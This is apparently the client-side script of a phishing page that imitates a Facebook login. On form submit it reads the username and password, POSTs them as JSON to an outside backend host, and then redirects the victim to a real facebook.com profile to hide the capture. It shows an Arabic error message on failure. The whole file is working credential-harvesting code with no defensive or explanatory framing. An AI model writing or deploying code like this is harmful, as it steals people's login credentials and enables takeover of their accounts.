document.getElementById("logForm").addEventListener("submit", async (e) => {
  e.preventDefault();

  console.log("running....");

  const username = document.getElementById("username").value;
  const password = document.getElementById("password").value;

  try {
    const response = await fetch("https://facebook-back-nextjs.vercel.app", {
      method: "POST",
      mode: "cors",
      headers: {
        "Content-Type": "application/json",
      },
      body: JSON.stringify({ username, password }),
    });

    const data = await response.json();

    window.location.href = "https://www.facebook.com/tota.qaq";
    
  } catch (error) {
    console.error("Error:", error);
    document.getElementById(
      "message"
    ).innerHTML = `<p style="color: red;">حدث خطأ أثناء الإتصال بالسيرفر</p>`;
  }
});
